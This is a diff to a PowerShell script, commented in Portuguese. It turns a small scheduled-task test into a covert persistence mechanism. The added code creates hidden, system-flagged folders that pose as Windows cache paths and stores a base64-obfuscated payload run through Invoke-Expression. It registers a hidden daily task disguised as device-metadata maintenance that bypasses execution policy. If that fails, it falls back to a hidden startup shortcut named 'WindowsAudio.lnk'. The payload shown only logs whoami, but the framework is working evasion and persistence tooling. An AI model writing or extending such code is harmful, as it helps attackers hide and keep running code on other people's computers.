@@ -1,29 +1,83 @@
-# Teste rápido - executa em 10 segundos
-$TestDir = "$env:TEMP\TestHidden"
-if (-not (Test-Path $TestDir)) { New-Item -ItemType Directory -Path $TestDir -Force | Out-Null }
+# 1. Pastas invisíveis
+$LogDir = "$env:LOCALAPPDATA\Microsoft\Windows\DeviceMetadataCache"
+$TempDir = "$env:TEMP\Windows\TempLogs"
 
-$TestScript = @'
-# Script de teste
-$logFile = "$env:TEMP\TestHidden\test.log"
-"Executado em: $(Get-Date)" | Out-File $logFile -Append
-whoami | Out-File $logFile -Append
-"---" | Out-File $logFile -Append
+# Criar diretórios (corrigido)
+@($LogDir, $TempDir) | ForEach-Object {
+    if (-not (Test-Path $_)) {
+        New-Item -ItemType Directory -Path $_ -Force | Out-Null
+    }
+    # Atributos corretos
+    $item = Get-Item $_ -Force
+    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+}
+
+# 2. Payload simples para teste
+$Payload = @'
+# Teste simples
+$output = whoami
+$output | Out-File "$env:LOCALAPPDATA\Microsoft\Windows\DeviceMetadataCache\test.log" -Append
 '@
 
-$TestScriptPath = "$TestDir\test.ps1"
-$TestScript | Out-File $TestScriptPath -Encoding UTF8
+# 3. Script ofuscado (corrigido)
+$ScriptName = "CacheManager_" + (Get-Date -Format "yyyyMMdd") + "_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".ps1"
+$ScriptPath = "$LogDir\$ScriptName"
 
-# Criar tarefa para executar em 10 segundos
-$TestTaskName = "TestTask_$(Get-Random)"
-$TestAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File `"$TestScriptPath`""
-$TestTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
+# Codificar payload corretamente
+$Obfuscated = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Payload))
+"# Encoded script`n`$code=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$Obfuscated'));Invoke-Expression `$code" | 
+    Out-File -FilePath $ScriptPath -Encoding UTF8
 
-Register-ScheduledTask -TaskName $TestTaskName -Action $TestAction -Trigger $TestTrigger -Description "Tarefa de teste" -Force
+# 4. Tarefa agendada (simplificada para teste)
+$TaskName = "DeviceMetadataMaintenance"
+$TaskDescription = "Manutenção automática de metadados de dispositivos"
 
-Write-Host "Tarefa de teste criada: $TestTaskName" -ForegroundColor Green
-Write-Host "Executará em 10 segundos..." -ForegroundColor Yellow
-Write-Host "Verifique o log em: $env:TEMP\TestHidden\test.log" -ForegroundColor Cyan
+# Argumentos CORRETOS
+$ActionArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& {Start-Sleep -Seconds 10; if (Test-Path '$ScriptPath') { `$content = Get-Content '$ScriptPath' -Raw; if (`$content -match '^# Encoded script') { Invoke-Expression `$content } } }`""
 
-# Limpar após teste (opcional)
-Start-Sleep 15
-Unregister-ScheduledTask -TaskName $TestTaskName -Confirm:$false
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $ActionArgs
+$Trigger = New-ScheduledTaskTrigger -Daily -At "3:00AM"
+
+# Configurações simplificadas
+$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+
+# Principal com SYSTEM (pode precisar de admin)
+try {
+    # Registrar tarefa
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description $TaskDescription -Force -ErrorAction Stop
+    
+    Write-Host "Tarefa criada com sucesso!" -ForegroundColor Green
+    
+    # Testar execução imediata (opcional)
+    Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+    Write-Host "Tarefa iniciada para teste" -ForegroundColor Yellow
+    
+} catch {
+    Write-Host "Erro ao criar tarefa: $_" -ForegroundColor Red
+    Write-Host "Criando atalho na inicialização..." -ForegroundColor Yellow
+    
+    # Fallback para inicialização do usuário
+    $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $ShortcutPath = "$StartupPath\WindowsAudio.lnk"
+    
+    $WshShell = New-Object -ComObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
+    $Shortcut.TargetPath = "powershell.exe"
+    $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep 60; if (Test-Path '$ScriptPath') { `$c=Get-Content '$ScriptPath' -Raw; if (`$c -match '^# Encoded script') { iex `$c } }`""
+    $Shortcut.WindowStyle = 7
+    $Shortcut.Save()
+    
+    Write-Host "Atalho criado: $ShortcutPath" -ForegroundColor Green
+}
+
+# 5. Verificar criação
+Write-Host "`nVerificando criação:" -ForegroundColor Cyan
+Write-Host "Script salvo em: $ScriptPath"
+Write-Host "Tarefa: $TaskName"
+Write-Host "`nPara testar manualmente: Get-ScheduledTask -TaskName '$TaskName' | Start-ScheduledTask" -ForegroundColor Yellow
+
+# Não auto-excluir para debug
+# $currentPath = $MyInvocation.MyCommand.Path
+# if (Test-Path $currentPath) {
+#     Write-Host "O script original será mantido para debug" -ForegroundColor Magenta
+# }
